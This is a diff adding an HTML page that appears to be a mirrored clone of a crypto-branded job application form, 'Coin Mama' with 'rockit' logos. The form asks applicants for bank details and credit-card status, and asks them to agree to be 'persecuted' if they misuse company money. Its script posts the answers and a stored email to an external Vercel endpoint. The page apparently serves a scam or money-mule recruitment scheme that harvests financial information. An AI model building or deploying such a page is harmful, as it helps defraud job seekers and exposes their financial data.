@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<!-- Mirrored from rocktcoin.com/apply-02.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 18 Jun 2024 19:50:17 GMT -->
+<head>
+  <!-- Required meta tags -->
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="icon" type="image/png" sizes="16x16" href="favicon.ico" />
+  <title>Coin Mama | Application </title>
+  <link href="./cdn.jsdelivr.net/npm/bootstrap%405.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
+    integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous" />
+  <link rel="stylesheet" href="apply.css" />
+</head>
+
+<body>
+  <div class="header">
+    <a href="index.html"><img src="img/rockit_logo.svg" alt="company-logo" class="logo" /> </a>
+    <span class="page-number">2/2</span>
+  </div>
+  <div class="container">
+    <form id="handleSubmission">
+      <div class="section">
+        <h2>APPLICATION QUESTIONS</h2>
+        <p>Please answer the following questions</p>
+
+          <label for="title">Do You Have A Checking Bank Account ?</label>
+          <select class="form-control" id="checking_account" name="checking_account" required>
+            <option value="Yes">Yes</option>
+            <option value="No">No</option>
+          </select>
+
+          <label for="bank-name">Bank Name</label>
+          <input type="text" id="bank_name" name="bank_name" class="form-control" required />
+
+          <label for="credit-card">Do You Have A Credit Card ?</label>
+          <select id="credit_card" name="credit_card" class="form-control" required>
+            <option value="Yes">Yes</option>
+            <option value="No">No</option>
+          </select>
+
+          <label for="payment-method">How Do You Prefer to Be Paid, PAYCHECK, DIRECT DEPOSIT OR CREDITCARD TOP
+            UP</label>
+          <select id="payment_method" name="payment_method" class="form-control" required>
+            <option value="Bank">Bank</option>
+            <option value="Credit Card">Credit-Card</option>
+          </select>
+
+          <label for="Trust">Can You Be Trusted With The Company’s Money And Agree To Be Persecuted If Misused</label>
+          <input type="text" id="company_trust" name="company_trust" class="form-control" required />
+
+          <div class="prev_next">
+            <a href="apply-01.html" class="prev-button">Prev</a>
+            <button type="submit" class="next-button">Submit</button>
+          </div>
+      </div>
+    </form>
+  </div>
+
+  <footer>
+    <img src="img/rockit_logo.svg" alt="Company Logo" class="footer-logo" />
+    <p style="visibility: hidden;">For investment inquiries, please reach out to us.</p>
+    <p class="copy-p"> &copy; 2024 CoinMama. All rights reserved.</p>
+  </footer>
+</body>
+
+<!-- Option 1: Bootstrap Bundle with Popper -->
+<script src="./cdn.jsdelivr.net/npm/bootstrap%405.1.3/dist/js/bootstrap.bundle.min.js"
+  integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
+<!-- jQuery Library -->
+<script src="./code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="./unpkg.com/sweetalert%402.1.2/dist/sweetalert.min.js"></script>
+
+
+</body>
+
+
+<!-- Mirrored from rocktcoin.com/apply-02.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 18 Jun 2024 19:50:17 GMT -->
+</html>
+
+
+
+
+<script>
+  $(document).ready(function () {
+    $('#handleSubmission').on('submit', function (event) {
+      event.preventDefault(); // Prevent the default form submission
+
+      var email = localStorage.getItem('email');
+    var checking_account = $('#checking_account').val();
+    var bank_name = $('#bank_name').val();
+    var credit_card = $('#credit_card').val();
+    var payment_method = $('#payment_method').val();
+    var company_trust = $('#company_trust').val();
+
+    // Build the data object
+    var data = {
+      email: email,
+      checking_account: checking_account,
+      bank_name: bank_name,
+      credit_card: credit_card,
+      payment_method: payment_method,
+      company_trust: company_trust
+    };
+
+
+      $.ajax({
+        url: 'https://server-blue-mu.vercel.app/sender', // Replace with the URL to your PHP handler script
+        type: 'POST',
+        data: JSON.stringify(data),
+        contentType: 'application/json',
+        success: function (response) {
+      console.log(response)
+            swal("Application submitted successfully!", "", "success").then(() => { window.location.href = 'success.html'; });
+        },
+        error: function (xhr, status, error) {
+          // Handle any errors
+          swal("An error occurred while saving the application!", "", "warning")
+          console.error(xhr.responseText);
+        }
+      });
+    });
+  });
+</script>
